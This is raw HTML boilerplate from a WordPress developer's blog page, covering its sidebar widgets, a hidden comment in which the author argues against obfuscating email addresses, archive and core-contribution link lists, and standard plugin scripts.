		<p>Website(Optional): <br /><input type="text" size="16" title="Your website (will be displayed)" name="os0" value="" /></p><p><input class="ppimg" type="image" src="https://www.paypal.com/en_US/i/btn/x-click-but21.gif" name="submit" style="border:0;" alt="Make payments with PayPal - fast, free and secure" /></p></form></div></li>
<li id="text-7" class="widget widget_text">			<div class="textwidget">Hey, I also take Bitcoins! Send them to: </br>
<a href="bitcoin:1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg">
<img src="https://chart.googleapis.com/chart?chs=150x150&cht=qr&chl=bitcoin:1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg" /><br />
1ottoqnFyTtaB6GiJZxMQ79rsSqBL2ZBg</a></div>
		</li>
<li id="text-5" class="widget widget_text"><h2 class="widgettitle">Subscribe!</h2>
			<div class="textwidget"><!-- <a href="https://plus.google.com/111166992820603637934?prsrc=3" style="cursor:pointer;display:inline-block;text-decoration:none;color:#333;font:13px/16px arial,sans-serif;"><span style="display:inline-block;font-weight:bold;vertical-align:top;margin-right:5px;margin-top:8px;">Otto on WordPress</span><span style="display:inline-block;vertical-align:top;margin-right:15px;margin-top:8px;">on</span><img src="https://ssl.gstatic.com/images/icons/gplus-32.png" alt="" style="border:0;width:32px;height:32px;"/></a>
-->
<div class="g-plus" data-href="https://plus.google.com/111166992820603637934?rel=publisher" data-width="250" data-height="131" data-theme="light"></div>
</div>
		</li>
<li id="blog_subscription-3" class="widget jetpack_subscription_widget"><h2 class="widgettitle"><label for="subscribe-field"></label></h2>

		<form action="#" method="post" accept-charset="utf-8" id="subscribe-blog-blog_subscription-3">
			<p id="subscribe-text">Enter your email address to subscribe to this blog and receive notifications of new posts by email.</p><p>Join 331 other subscribers</p>

			<p id="subscribe-email"><input type="text" name="email" value="Email Address" id="subscribe-field" onclick="if ( this.value == 'Email Address' ) { this.value = ''; }" onblur="if ( this.value == '' ) { this.value = 'Email Address'; }" /></p>

			<p id="subscribe-submit">
				<input type="hidden" name="action" value="subscribe" />
				<input type="hidden" name="source" value="http://ottopress.com/tag/theme/page/2/" />
				<input type="hidden" name="sub-type" value="widget" />
				<input type="hidden" name="redirect_fragment" value="blog_subscription-3" />
								<input type="submit" value="Subscribe" name="jetpack_subscriptions_widget" />
			</p>
		</form>

		
</li>
<li id="text-3" class="widget widget_text"><h2 class="widgettitle">Email Me</h2>
			<div class="textwidget"><ul><li><span class="vcard microid-mailto+http:sha1:23e9670868f6d2b16fe1f6b3db80c8f0423a082a">
<span style="display:none;">
<span class="adr">
 <span class="locality">Memphis</span>,
 <span class="region">TN</span>
 <span class="postal-code">38103</span>
 <span class="country-name">U.S.A.</span>
</span>
<a class="url fn" href="http://ottodestruct.com">Otto</a>
<span class="uid">240cf86e-5cad-11dc-8314-0800200c9a66</span>
</span>
<a class="email" href="mailto:otto@ottodestruct.com">otto@ottodestruct.com</a></span></li></ul>
<a rel="author" href="https://plus.google.com/100201852715113506716?rel=author">
  <img src="https://ssl.gstatic.com/images/icons/gplus-16.png" width="16" height="16">
</a>
</a>
<!-- 

This rant is hidden in HTML comments. If I pointed you to it, then you probably emailed me about the fact that my email address is in plaintext directly above this comment. If you happened to run across it because you just like looking at HTML comments, well, easter egg! :)

YES, that is a bare mailto: href above. 
YES, that is my real email address. 
And YES, it's intentional.

Obfuscating your email address on the web is stupid. 

Firstly, hiding your email address doesn't prevent spam. Spammers get addresses in bulk from mailing lists and websites and other sources. Sure, some scrapers exist, but they are by far the minority of the sources for email lists.

Secondly, hiding your email address ruins the whole point of email. The purpose of publishing my email address is so that anybody, and I do mean *anybody*, can email me. Before the days of cell phones, your phone number and physical address used to be published in a big book that everybody received, for free, on a semi-annual basis. It had distinctive yellow pages in it. Your contact information is not, and never was supposed to be, private information. Treating it as such is stupid.

Thirdly, I have great spam protection. For one, I use GMail, which has frankly incredible filtering because of the volume of mail they deal with. For another, I use various sets of filters to categorize incoming mail into various categories of things. Hell, I can even run statistics on it, if I want. This is a much better solution than continually giving out fake email addresses, or using +stuff to figure out who sent what where... I'd prefer to simply let my filters deal with it instead. 

Finally, if you're one of those systems that scours the web and/or social networks for visible email addresses and then automatically emails that person to let them know that their address is visible, then by all means please just fuck off and die. You're part of the problem. On the other hand, if you're just a regular guy with good intentions, then this doesn't apply to you. :)

Just my 2 cents.

--></div>
		</li>
<li id="categories-2" class="widget widget_categories"><h2 class="widgettitle">Categories</h2>
		<ul>
	<li class="cat-item cat-item-573"><a href="http://ottopress.com/category/code/" title="View all posts filed under Code">Code</a>
</li>
	<li class="cat-item cat-item-574"><a href="http://ottopress.com/category/other/" title="View all posts filed under Other">Other</a>
</li>
	<li class="cat-item cat-item-575"><a href="http://ottopress.com/category/rants/" title="View all posts filed under Rants">Rants</a>
</li>
	<li class="cat-item cat-item-1"><a href="http://ottopress.com/category/uncategorized/" title="View all posts filed under Uncategorized">Uncategorized</a>
</li>
	<li class="cat-item cat-item-576"><a href="http://ottopress.com/category/wordpress/" title="View all posts filed under WordPress">WordPress</a>
</li>
		</ul>
</li>
<li id="archives-2" class="widget widget_archive"><h2 class="widgettitle">Archives</h2>
		<ul>
	<li><a href='http://ottopress.com/2014/02/'>February 2014</a></li>
	<li><a href='http://ottopress.com/2013/11/'>November 2013</a></li>
	<li><a href='http://ottopress.com/2013/10/'>October 2013</a></li>
	<li><a href='http://ottopress.com/2013/06/'>June 2013</a></li>
	<li><a href='http://ottopress.com/2013/03/'>March 2013</a></li>
	<li><a href='http://ottopress.com/2012/11/'>November 2012</a></li>
	<li><a href='http://ottopress.com/2012/09/'>September 2012</a></li>
	<li><a href='http://ottopress.com/2012/08/'>August 2012</a></li>
	<li><a href='http://ottopress.com/2012/07/'>July 2012</a></li>
	<li><a href='http://ottopress.com/2012/05/'>May 2012</a></li>
	<li><a href='http://ottopress.com/2012/02/'>February 2012</a></li>
	<li><a href='http://ottopress.com/2012/01/'>January 2012</a></li>
	<li><a href='http://ottopress.com/2011/12/'>December 2011</a></li>
	<li><a href='http://ottopress.com/2011/11/'>November 2011</a></li>
	<li><a href='http://ottopress.com/2011/10/'>October 2011</a></li>
	<li><a href='http://ottopress.com/2011/09/'>September 2011</a></li>
	<li><a href='http://ottopress.com/2011/08/'>August 2011</a></li>
	<li><a href='http://ottopress.com/2011/07/'>July 2011</a></li>
	<li><a href='http://ottopress.com/2011/06/'>June 2011</a></li>
	<li><a href='http://ottopress.com/2011/05/'>May 2011</a></li>
	<li><a href='http://ottopress.com/2011/04/'>April 2011</a></li>
	<li><a href='http://ottopress.com/2011/03/'>March 2011</a></li>
	<li><a href='http://ottopress.com/2011/02/'>February 2011</a></li>
	<li><a href='http://ottopress.com/2011/01/'>January 2011</a></li>
	<li><a href='http://ottopress.com/2010/12/'>December 2010</a></li>
	<li><a href='http://ottopress.com/2010/11/'>November 2010</a></li>
	<li><a href='http://ottopress.com/2010/10/'>October 2010</a></li>
	<li><a href='http://ottopress.com/2010/09/'>September 2010</a></li>
	<li><a href='http://ottopress.com/2010/08/'>August 2010</a></li>
	<li><a href='http://ottopress.com/2010/06/'>June 2010</a></li>
	<li><a href='http://ottopress.com/2010/05/'>May 2010</a></li>
	<li><a href='http://ottopress.com/2010/04/'>April 2010</a></li>
	<li><a href='http://ottopress.com/2010/03/'>March 2010</a></li>
	<li><a href='http://ottopress.com/2010/02/'>February 2010</a></li>
	<li><a href='http://ottopress.com/2009/11/'>November 2009</a></li>
	<li><a href='http://ottopress.com/2009/09/'>September 2009</a></li>
	<li><a href='http://ottopress.com/2008/09/'>September 2008</a></li>
		</ul>
</li>
		<li id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widgettitle">Recent Posts</h2>
		<ul>
					<li>
				<a href="http://ottopress.com/2014/better-know-a-vulnerability-cross-site-request-forgery-csrf/">Better Know a Vulnerability: Cross Site Request Forgery (CSRF)</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/better-know-a-vulnerability-sql-injection/">Better Know a Vulnerability: SQL Injection</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/language-packs-101-prepwork/">Language Packs 101 &#8211; Prepwork</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/slides-a-presentation-theme/">Slides: A Presentation Theme</a>
						</li>
					<li>
				<a href="http://ottopress.com/2013/im-not-a-fan-of-orange/">I&#8217;m not a fan of orange&#8230;</a>
						</li>
				</ul>
		</li>
<li id="text-6" class="widget widget_text"><h2 class="widgettitle">WP Core Contributions</h2>
			<div class="textwidget"><p>
<a href='http://core.trac.wordpress.org/changeset/28072'>[28072]</a> - <a href='http://core.trac.wordpress.org/ticket/19393'>#19393</a><br />
<a href='http://core.trac.wordpress.org/changeset/27522'>[27522]</a> - <a href='http://core.trac.wordpress.org/ticket/19889'>#19889</a><br />
<a href='http://core.trac.wordpress.org/changeset/27399'>[27399]</a> - <a href='http://core.trac.wordpress.org/ticket/25665'>#25665</a><br />
<a href='http://core.trac.wordpress.org/changeset/26978'>[26978]</a> - <a href='http://core.trac.wordpress.org/ticket/23149'>#23149</a><br />
<a href='http://core.trac.wordpress.org/changeset/26711'>[26711]</a> - <a href='http://core.trac.wordpress.org/ticket/21442'>#21442</a><br />
<a href='http://core.trac.wordpress.org/changeset/26072'>[26072]</a> - <a href='http://core.trac.wordpress.org/ticket/25858'>#25858</a><br />
<a href='http://core.trac.wordpress.org/changeset/22152'>[22152]</a> - <a href='http://core.trac.wordpress.org/ticket/21914'>#21914</a><br />
<a href='http://core.trac.wordpress.org/changeset/22026'>[22026]</a> - <a href='http://core.trac.wordpress.org/ticket/22002'>#22002</a><br />
<a href='http://core.trac.wordpress.org/changeset/21839'>[21839]</a> - <a href='http://core.trac.wordpress.org/ticket/16996'>#16996</a><br />
<a href='http://core.trac.wordpress.org/changeset/21802'>[21802]</a> - <a href='http://core.trac.wordpress.org/ticket/18674'>#18674</a><br />
<a href='http://core.trac.wordpress.org/changeset/21776'>[21776]</a> - <a href='http://core.trac.wordpress.org/ticket/13729'>#13729</a><br />
<a href='http://core.trac.wordpress.org/changeset/21609'>[21609]</a> - <a href='http://core.trac.wordpress.org/ticket/19324'>#19324</a><br />
<a href='http://core.trac.wordpress.org/changeset/20916'>[20916]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20784'>[20784]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20783'>[20783]</a> - <a href='http://core.trac.wordpress.org/ticket/20448'>#20448</a><br />
<a href='http://core.trac.wordpress.org/changeset/20267'>[20267]</a> - <a href='http://core.trac.wordpress.org/ticket/13774'>#13774</a><br />
<a href='http://core.trac.wordpress.org/changeset/19721'>[19721]</a> - <a href='http://core.trac.wordpress.org/ticket/19626'>#19626</a><br />
<a href='http://core.trac.wordpress.org/changeset/19003'>[19003]</a> - <a href="http://core.trac.wordpress.org/ticket/17406">#17406</a><br />
<a href='http://core.trac.wordpress.org/changeset/18741'>[18741]</a> - <a href="http://core.trac.wordpress.org/ticket/15473">#15473</a><br />
<a href='http://core.trac.wordpress.org/changeset/18602'>[18602]</a> - <a href="http://core.trac.wordpress.org/ticket/18230">#18230</a><br />
<a href='http://core.trac.wordpress.org/changeset/18541'>[18541]</a> - <a href="http://core.trac.wordpress.org/ticket/16687">#16687</a><br />
<a href='http://core.trac.wordpress.org/changeset/18205'>[18205]</a> - <a href="http://core.trac.wordpress.org/ticket/17148">#17148</a><br />
<a href='http://core.trac.wordpress.org/changeset/17254'>[17254]</a> - <a href="http://core.trac.wordpress.org/ticket/16192">#16192</a><br />
<a href='http://core.trac.wordpress.org/changeset/16555'>[16555]</a> - <a href="http://core.trac.wordpress.org/ticket/12891">#12891</a><br />
<a href='http://core.trac.wordpress.org/changeset/16284'>[16284]</a> - <a href="http://core.trac.wordpress.org/ticket/13324">#13324</a><br />
<a href='http://core.trac.wordpress.org/changeset/13420'>[13420]</a> - <a href="http://core.trac.wordpress.org/ticket/12291">#12291</a><br />
<a href='http://core.trac.wordpress.org/changeset/12581'>[12581]</a> - <a href="http://core.trac.wordpress.org/ticket/7225">#7225</a><br />
<a href='http://core.trac.wordpress.org/changeset/11738'>[11738]</a> - <a href="http://core.trac.wordpress.org/ticket/10145">#10145</a><br />
<a href='http://core.trac.wordpress.org/changeset/11329'>[11329]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10962'>[10962]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10757'>[10757]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10753'>[10753]</a> - <a href="http://core.trac.wordpress.org/ticket/3962">#3962</a><br />
<a href='http://core.trac.wordpress.org/changeset/10252'>[10252]</a> - <a href="http://core.trac.wordpress.org/ticket/6791">#6791</a><br />
<a href='http://core.trac.wordpress.org/changeset/9276'>[9276]</a> - <a href="http://core.trac.wordpress.org/ticket/7124">#7124</a><br />
<a href='http://core.trac.wordpress.org/changeset/9209'>[9209]</a> - <a href="http://core.trac.wordpress.org/ticket/7901">#7901</a><br />
<a href='http://core.trac.wordpress.org/changeset/9207'>[9207]</a> - <a href="http://core.trac.wordpress.org/ticket/7635">#7635</a><br />
<a href='http://core.trac.wordpress.org/changeset/9139'>[9139]</a> - <a href="http://core.trac.wordpress.org/ticket/7847">#7847</a><br />
<a href='http://core.trac.wordpress.org/changeset/9089'>[9089]</a> - <a href="http://core.trac.wordpress.org/ticket/7772">#7772</a><br />
<a href='http://core.trac.wordpress.org/changeset/8968'>[8968]</a> - <a href="http://core.trac.wordpress.org/ticket/7761">#7761</a><br />
<a href='http://core.trac.wordpress.org/changeset/8285'>[8285]</a> - <a href="http://core.trac.wordpress.org/ticket/6879">#6879</a><br />
<a href='http://core.trac.wordpress.org/changeset/8208'>[8208]</a> - <a href="http://core.trac.wordpress.org/ticket/4448">#4448</a><br />
<a href='http://core.trac.wordpress.org/changeset/8132'>[8132]</a> - <a href="http://core.trac.wordpress.org/ticket/4954">#4954</a><br />
<a href='http://core.trac.wordpress.org/changeset/8131'>[8131]</a> - <a href="http://core.trac.wordpress.org/ticket/6590">#6590</a><br />
<a href='http://core.trac.wordpress.org/changeset/7869'>[7869]</a> - <a href="http://core.trac.wordpress.org/ticket/6513">#6513</a><br />
<a href='http://core.trac.wordpress.org/changeset/7647'>[7647]</a> - <a href="http://core.trac.wordpress.org/ticket/6608">#6608</a><br />
<a href='http://core.trac.wordpress.org/changeset/7461'>[7461]</a> - <a href="http://core.trac.wordpress.org/ticket/6339">#6339</a><br />
<a href='http://core.trac.wordpress.org/changeset/6873'>[6873]</a> - <a href="http://core.trac.wordpress.org/ticket/4986">#4986</a><br />
<a href='http://core.trac.wordpress.org/changeset/6760'>[6760]</a> - <a href="http://core.trac.wordpress.org/ticket/4617">#4617</a><br />
<a href='http://core.trac.wordpress.org/changeset/6616'>[6616]</a> - <a href="http://core.trac.wordpress.org/ticket/5155">#5155</a><br />
<a href='http://core.trac.wordpress.org/changeset/6439'>[6439]</a> - <a href="http://core.trac.wordpress.org/ticket/2805">#2805</a><br />
<a href='http://core.trac.wordpress.org/changeset/6091'>[6091]</a> - <a href="http://core.trac.wordpress.org/ticket/4182">#4182</a><br />
<a href='http://core.trac.wordpress.org/changeset/6086'>[6086]</a> - <a href="http://core.trac.wordpress.org/ticket/4946">#4946</a><br />
<a href='http://core.trac.wordpress.org/changeset/5986'>[5986]</a> - <a href="http://core.trac.wordpress.org/ticket/4873">#4873</a><br />
<a href='http://core.trac.wordpress.org/changeset/5982'>[5982]</a> - <a href="http://core.trac.wordpress.org/ticket/4800">#4800</a><br />
<a href='http://core.trac.wordpress.org/changeset/5958'>[5958]</a> - <a href="http://core.trac.wordpress.org/ticket/4625">#4625</a><br />
<a href='http://core.trac.wordpress.org/changeset/5920'>[5920]</a> - <a href="http://core.trac.wordpress.org/ticket/4703">#4703</a><br />
<a href='http://core.trac.wordpress.org/changeset/5910'>[5910]</a> - <a href="http://core.trac.wordpress.org/ticket/4654">#4654</a><br />
<a href='http://core.trac.wordpress.org/changeset/5881'>[5881]</a> - <a href="http://core.trac.wordpress.org/ticket/4704">#4704</a><br />
<a href='http://core.trac.wordpress.org/changeset/5857'>[5857]</a> - <a href="http://core.trac.wordpress.org/ticket/4625">#4625</a><br />
<a href='http://core.trac.wordpress.org/changeset/5848'>[5848]</a> - <a href="http://core.trac.wordpress.org/ticket/4499">#4499</a><br />
<a href='http://core.trac.wordpress.org/changeset/5845'>[5845]</a> - <a href="http://core.trac.wordpress.org/ticket/4547">#4547</a><br />
<a href='http://core.trac.wordpress.org/changeset/5317'>[5317]</a> - <a href="http://core.trac.wordpress.org/ticket/4169">#4169</a><br />
<a href='http://core.trac.wordpress.org/changeset/5154'>[5154]</a> - <a href="http://core.trac.wordpress.org/ticket/4057">#4057</a><br />
<a href='http://core.trac.wordpress.org/changeset/5151'>[5151]</a> - <a href="http://core.trac.wordpress.org/ticket/4057">#4057</a><br />
<a href='http://core.trac.wordpress.org/changeset/5104'>[5104]</a> - <a href="http://core.trac.wordpress.org/ticket/3790">#3790</a><br />
<a href='http://core.trac.wordpress.org/changeset/4964'>[4964]</a> - <a href="http://core.trac.wordpress.org/ticket/3898">#3898</a><br />
</p></div>
		</li>
		</ul>
	</div>

</div>
<div id="footer">
<div style="float:left;"><a href="http://internetdefenseleague.org"><img src="http://internetdefenseleague.org/images/badges/final/footer_badge.png" alt="Member of The Internet Defense League" /></a></div>
<a href="http://ottopress.com/feed/">Entries (RSS)</a> and <a href="http://ottopress.com/comments/feed/">Comments (RSS)</a>.<br />
<span about="http://ottodestruct.com/" xmlns:cc="http://creativecommons.org/ns#">
This page, by <a property="cc:attributionName" rel="cc:attributionURL" href="http://ottodestruct.com/">Otto</a>, is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/3.0/">Creative Commons Attribution-ShareAlike License</a>.</span><br />
Powered by <a href="http://wordpress.org/" title="Powered by WordPress.">WordPress</a>.<br />
		<script type="text/javascript">
		//<![CDATA[
		var infiniteScroll = {"settings":{"id":"content","ajaxurl":"http:\/\/ottopress.com\/?infinity=scrolling","type":"scroll","wrapper":false,"wrapper_class":"infinite-wrap","footer":false,"click_handle":"1","text":"Older posts","totop":"Scroll back to top","currentday":"08.03.11","order":"DESC","scripts":[],"styles":[],"google_analytics":false,"offset":2,"history":{"host":"ottopress.com","path":"\/tag\/theme\/page\/%d\/","use_trailing_slashes":true,"parameters":""},"query_args":{"paged":2,"tag":"theme","error":"","m":"","p":0,"post_parent":"","subpost":"","subpost_id":"","attachment":"","attachment_id":0,"name":"","static":"","pagename":"","page_id":0,"second":"","minute":"","hour":"","day":0,"monthnum":0,"year":0,"w":0,"category_name":"","cat":"","tag_id":604,"author":"","author_name":"","feed":"","tb":"","comments_popup":"","meta_key":"","meta_value":"","preview":"","s":"","sentence":"","fields":"","menu_order":"","category__in":[],"category__not_in":[],"category__and":[],"post__in":[],"post__not_in":[],"tag__in":[],"tag__not_in":[],"tag__and":[],"tag_slug__in":["theme"],"tag_slug__and":[],"post_parent__in":[],"post_parent__not_in":[],"author__in":[],"author__not_in":[],"posts_per_page":7,"ignore_sticky_posts":false,"suppress_filters":false,"cache_results":true,"update_post_term_cache":true,"update_post_meta_cache":true,"post_type":"","nopaging":false,"comments_per_page":"50","no_found_rows":false,"order":"DESC"},"last_post_date":"2010-05-06 10:57:25","stats":"blog=12342457&host=ottopress.com&v=ext&j=1:3.0.2&x_pagetype=infinite-jetpack"}};
		//]]>
		</script>
		<img alt='css.php' src="http://ottopress.com/wp-content/plugins/cookies-for-comments/css.php?k=c6a73cb029f035cdaa9e9e8336d25169&amp;o=i&amp;t=463026520" width='1' height='1' />	<div style="display:none">
	</div>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shCore.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushPhp.js?ver=3.0.9'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/scripts/shBrushCss.js?ver=3.0.9'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shCore.css?ver=3.0.9";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "http://ottopress.com/wp-content/plugins/syntaxhighlighter/syntaxhighlighter3/styles/shThemeDefault.css?ver=3.0.9";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.strings.expandSource = '+ expand source';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = false;
	SyntaxHighlighter.defaults['toolbar'] = false;
	SyntaxHighlighter.all();
</script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/infinite-scroll/infinity.js?ver=20140514'></script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/photon/photon.js?ver=20130122'></script>
<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201430'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var mejsL10n = {"language":"en-US","strings":{"Close":"Close","Fullscreen":"Fullscreen","Download File":"Download File","Download Video":"Download Video","Play\/Pause":"Play\/Pause","Mute Toggle":"Mute Toggle","None":"None","Turn off Fullscreen":"Turn off Fullscreen","Go Fullscreen":"Go Fullscreen","Unmute":"Unmute","Mute":"Mute","Captions\/Subtitles":"Captions\/Subtitles"}};
var _wpmejsSettings = {"pluginPath":"\/wp-includes\/js\/mediaelement\/"};
/* ]]> */
</script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/mediaelement/mediaelement-and-player.min.js?ver=2.14.2'></script>
<script type='text/javascript' src='http://ottopress.com/wp-includes/js/mediaelement/wp-mediaelement.js?ver=3.9.1'></script>
<script type='text/javascript' src='http://s.gravatar.com/js/gprofiles.js?ver=2014Julaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='http://ottopress.com/wp-content/plugins/jetpack/modules/wpgroho.js?ver=3.9.1'></script>
<script type="text/javascript">
			jQuery.extend( infiniteScroll.settings.scripts, ["jquery-core","jquery-migrate","jquery","tiled-gallery","spin","jquery.spin","syntaxhighlighter-core","syntaxhighlighter-brush-php","syntaxhighlighter-brush-css","the-neverending-homepage","jetpack-photon","devicepx","mediaelement","wp-mediaelement","grofiles-cards","wpgroho"] );
			jQuery.extend( infiniteScroll.settings.styles, ["yarppWidgetCss","jetpack-subscriptions","the-neverending-homepage","tiled-gallery","mediaelement","wp-mediaelement"] );
		</script>
	<script src="http://stats.wordpress.com/e-201430.js" type="text/javascript"></script>
	<script type="text/javascript">
	st_go({v:'ext',j:'1:3.0.2',blog:'12342457',post:'0',tz:'-5'});
	var load_cmc = function(){linktracker_init(12342457,0,2);};
	if ( typeof addLoadEvent != 'undefined' ) addLoadEvent(load_cmc);
	else load_cmc();
	</script></div></div>

<script type="text/javascript">
    window._idl = {};
    _idl.variant = "modal";
    (function() {
        var idl = document.createElement('script');
        idl.type = 'text/javascript';
        idl.async = true;
        idl.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'members.internetdefenseleague.org/include/?url=' + (_idl.url || '') + '&campaign=' + (_idl.campaign || '') + '&variant=' + (_idl.variant || 'banner');
        document.getElementsByTagName('body')[0].appendChild(idl);
    })();
</script>

</body>
</html>

